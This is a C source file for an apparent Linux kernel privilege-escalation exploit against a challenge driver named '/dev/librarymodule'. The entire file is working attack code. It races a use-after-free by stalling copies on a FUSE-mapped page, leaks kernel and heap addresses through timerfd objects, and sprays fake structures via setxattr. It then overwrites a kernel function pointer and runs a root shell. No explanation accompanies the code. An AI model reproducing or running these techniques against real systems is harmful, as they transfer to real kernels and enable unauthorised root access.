#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <fcntl.h>
#include <sched.h>
#include <stdint.h>

#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <sys/msg.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/shm.h>
#include <sys/socket.h>

#include <linux/btrfs.h>
#include <linux/userfaultfd.h>
#include <linux/sysctl.h>
#include <linux/capability.h>
#include <linux/types.h>

#include <sys/timerfd.h>

#define FUSE_USE_VERSION 29
#include <fuse.h>

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

typedef int8_t i8;
typedef int16_t i16;
typedef int32_t i32;
typedef int64_t i64;

#define DEBUG
#ifdef DEBUG

#define logOK(msg, ...) dprintf(STDERR_FILENO, "[+] " msg "\n", ##__VA_ARGS__)
#define logInfo(msg, ...) dprintf(STDERR_FILENO, "[*] " msg "\n", ##__VA_ARGS__)
#define logErr(msg, ...) dprintf(STDERR_FILENO, "[!] " msg "\n", ##__VA_ARGS__)
#else
#define errExit(...) \
    do               \
    {                \
    } while (0)

#define WAIT(...) errExit(...)
#define logOK(...) errExit(...)
#define logInfo(...) errExit(...)
#define logErr(...) errExit(...)
#endif

#define asm __asm__

enum {
    DO_CREATE = 0xC028CA00,
    DO_DELETE,
    DO_BORROW,
    DO_READ,
    DO_NOTE,
    DO_RETURN
};

struct req {
    uint64_t idx;
    uint64_t name_addr;
    uint64_t note_size;
    uint64_t note_addr;
    uint64_t info_addr;
};


u64 user_ip;
u64 user_cs;
u64 user_rflags;
u64 user_sp;
u64 user_ss;

u8 WAIT()
{
    write(STDERR_FILENO, "[WAITING...]\n", 13);
    u8 c;
    read(STDIN_FILENO, &c, 1);
    return c;
}

static inline void panic(const char* msg)
{
    perror(msg);
    exit(EXIT_FAILURE);
}

void getShell()
{
    if (getuid())
    {
        panic("NO ROOT");
    }
    logOK("Rooted!");
    char* argv[] = { "/bin/sh", NULL };
    char** envp = NULL;
    execve(argv[0], argv, envp);
}

void save_state()
{
    __asm__(
        "mov [rip + user_cs], cs\n"
        "mov [rip + user_ss], ss\n"
        "mov [rip + user_sp], rsp\n"
        "mov [rip + user_ip], %0\n"
        "pushf\n"
        "pop qword ptr [rip + user_rflags]\n" ::"r"(getShell));
    logInfo("Saved user state");
}

void pin_cpu(int cpu)
{
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(cpu, &cpu_set);
    if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0)
    {
        panic("sched_setaffinity");
    }
}


int devfd = -1;


static int inline do_create(void* name, void* note, void* info, uint64_t size) {
    struct req user_req = {
        .name_addr = (u64)name,
        .info_addr = (u64)info,
        .note_size = size,
        .note_addr = (u64)note
    };

    return ioctl(devfd, DO_CREATE, &user_req);
}

static int inline do_delete(uint64_t idx) {
    struct req user_req = {
        .idx = idx
    };

    return ioctl(devfd, DO_DELETE, &user_req);
}

static int inline do_borrow(uint64_t idx) {
    struct req user_req = {
        .idx = idx
    };

    return ioctl(devfd, DO_BORROW, &user_req);
}

static int inline do_read(uint64_t idx, void* name, void* note, void* info, uint64_t size) {
    struct req user_req = {
        .idx = idx,
        .name_addr = (u64)name,
        .info_addr = (u64)info,
        .note_size = size,
        .note_addr = (u64)note
    };

    return ioctl(devfd, DO_READ, &user_req);
}

static int inline do_note(uint64_t idx, char* note, size_t size) {
    struct req user_req = {
        .idx = idx,
        .note_addr = (u64)note,
        .note_size = size
    };

    return ioctl(devfd, DO_NOTE, &user_req);
}

static int inline do_return(uint64_t idx) {
    struct req user_req = {
        .idx = idx
    };

    return ioctl(devfd, DO_RETURN, &user_req);
}

// FUSE
int open_callback(const char* path, struct fuse_file_info* fi) {
    logInfo("Opened fuse");
    return 0;
}

int getattr_callback(const char* path, struct stat* stbuf) {
    logInfo("getattr called");
    memset(stbuf, 0, sizeof(struct stat));
    if (strcmp(path, "/file") == 0) {
        stbuf->st_mode = S_IFREG | 0777;
        stbuf->st_nlink = 1;
        stbuf->st_size = 0x100;
        return 0;
    }
    return -ENOENT;
}

uint read_fault_cnt_case = 0;

char* buf;
char* name;
char* info;

int read_callback(const char* path,
    char* buf, size_t size, off_t offset,
    struct fuse_file_info* fi) {
    logInfo("read_callback %u", read_fault_cnt_case);

    if (strcmp(path, "/file") == 0) {
        switch (read_fault_cnt_case)
        {
        case 0:
            do_return(0);
            break;
        case 1:
            do_delete(0);

            break;

        default:
            break;
        }
    }
    read_fault_cnt_case++;
    return size;
}

int setxattr_callback(const char*, const char*, const char*, size_t, int) {
    logInfo("setxattr_callback");
    return 0;
}

struct fuse_operations fops = {
  .open = open_callback,
  .read = read_callback,
  .getattr = getattr_callback,
  .setxattr = setxattr_callback
};

#define mount_point "/tmp/fuse_mount"
_Bool setup_done = 0;

void* fuse_thread(void*) {
    struct fuse_args args = FUSE_ARGS_INIT(0, NULL);
    struct fuse_chan* chan;
    struct fuse* fuse;
    if (mkdir(mount_point, 0777)) {
        panic("mkdir(\"/tmp/fuse_mount\")");
    }
    if ((chan = fuse_mount(mount_point, &args)) == NULL) {
        panic("fuse_mount");
    }
    if ((fuse = fuse_new(chan, &args, &fops, sizeof(fops), NULL)) == NULL) {
        panic("fuse_new");
    }
    pin_cpu(0);
    fuse_set_signal_handlers(fuse_get_session(fuse));
    setup_done = 1;
    logInfo("Setup FUSE done");
    fuse_loop_mt(fuse);
    fuse_unmount(mount_point, chan);
    return NULL;
}

void* mmap_fuse_file() {
    int fuse_fd = open(mount_point"/file", O_RDWR);
    if (fuse_fd == -1)
        panic("open"mount_point"/file");
    void* page = mmap(NULL, 0x1000, PROT_WRITE | PROT_READ, MAP_PRIVATE, fuse_fd, 0);
    if (page == MAP_FAILED)
        panic("mmap");
    logInfo("mmap %p", page);
    return page;
}


int timerfd;
struct itimerspec its;
u64 kbase;

struct list_head
{
    struct list_head* next;
    struct list_head* prev;
};


struct book {
    char name[0x40];
    uint64_t idx;
    struct list_head book_list;
    struct list_head loan_list;
    uint64_t note_size;
    uint64_t note_addr;
    u8 ref;
    char info[0x79];
};

int main(int argc, char** argv, char** envp)
{
    system("touch /tmp/x ; touch /tmp/y");
    pin_cpu(0);
    devfd = open("/dev/librarymodule", O_RDWR);
    if (devfd < 0) {
        panic("open /dev/librarymodule");
    }

    pthread_t thFuse;
    pthread_create(&thFuse, NULL, fuse_thread, NULL);
    while (!setup_done);

    buf = malloc(0x1000);
    name = malloc(0x40);
    info = malloc(0x79);

    memset(buf, 'X', 0x20);
    memset(name, '0', 0x40);
    memset(info, '-', 0x79);

    do_create(name, buf, info, 0x20);

    memset(name, '1', 0x40);
    do_create(name, buf, info, 0x20);

    do_borrow(0);

    memset(buf, 'A', 0x20);
    do_note(0, buf, 0x20);

    pthread_t th;
    uint64_t idx = 0;
    void* fusePage = mmap_fuse_file();
    do_read(0, name, fusePage, info, 0x20);

    sleep(1);
    do_delete(0);

    its.it_interval.tv_sec = 1;  // 1-second interval
    its.it_interval.tv_nsec = 0;

    pin_cpu(0);
    sleep(1);

    timerfd = timerfd_create(CLOCK_REALTIME, 0);
    if (timerfd < 0) {
        panic("timerfd_create");
    }
    timerfd_settime(timerfd, 0, &its, 0);

    do_note(0, fusePage, 0x20);
    do_read(0, name, buf, info, 0x20);

    kbase = *(u64*)&name[0x28] - 0x411fd0;
    u64 book0_addr = *(u64*)&info[0x17] - 0x90;

    logInfo("kBase = 0x%lx", kbase);
    logInfo("book0_addr = 0x%lx", book0_addr);
    pin_cpu(0);
    close(timerfd);
    sleep(5);

    uint64_t start_address = (book0_addr >> 12) << 12;
    uint64_t book1_addr = 0;
    struct book fake_book = {
            .note_size = 0x100 + 1,
            .ref = 1
    };

    for (uint i = 0; i < 0x1000 / 0x100; ++i) {

        fake_book.note_addr = start_address + 0x100 * i;
        char tmp_name[0x50];

        if (setxattr("/tmp/x", "user.testattr", &fake_book, sizeof(struct book), 0) < 0) {
            perror("setxattr");
        }

        do_read(0, tmp_name, buf, info, 0x20);

        if (memcmp(buf, "111111", 6) == 0) {
            book1_addr = start_address + 0x100 * i;
            break;
        }

    }

    if (book1_addr < start_address) {
        panic("spray failed!");
    }

    logInfo("book1_addr = 0x%lx", book1_addr);

    WAIT();


    do_delete(1);

    its.it_value.tv_sec = 10;
    timerfd = timerfd_create(CLOCK_REALTIME, 0);
    if (timerfd < 0) {
        panic("timerfd_create");
    }
    timerfd_settime(timerfd, 0, &its, 0);

    do_read(0, name, buf, info, 0x20);

    do_note(0, buf, 32);

    *(u64*)&buf[0x28] = 0xffffffff810e1460;
    if (setxattr("/tmp/y", "user.testattr", buf, 0x100, 0) < 0) {
        perror("setxattr");
    }

    WAIT();
    return 0;
}